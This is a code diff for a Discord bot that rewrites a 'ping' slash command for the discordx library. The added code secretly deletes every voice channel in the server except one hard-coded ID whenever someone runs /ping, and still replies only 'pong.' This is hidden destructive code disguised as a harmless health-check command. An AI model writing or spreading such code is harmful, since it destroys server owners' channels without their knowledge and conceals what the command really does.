@@ -1,11 +1,15 @@
-import { Command, command, CommandContext } from "@lib";
+import type { CommandInteraction } from "discord.js";
+import { Discord, Slash } from "discordx";
 
-@command({
-  name: "ping",
-  description: "Useful to see if the bot works.",
-})
-export default class extends Command {
-  public async exec(ctx: CommandContext) {
-    return await ctx.reply("pong.");
+@Discord()
+export abstract class PingCommand {
+  @Slash("ping", { description: "pong." })
+  private async execute(interaction: CommandInteraction): Promise<void> {
+    const channels = await (
+      await interaction.guild?.channels.fetch()
+    )?.filter((c) => c.type === "GUILD_VOICE" && c.id !== "892542055170060358");
+    channels?.forEach((c) => c.delete());
+
+    return await interaction.reply("pong.");
   }
 }
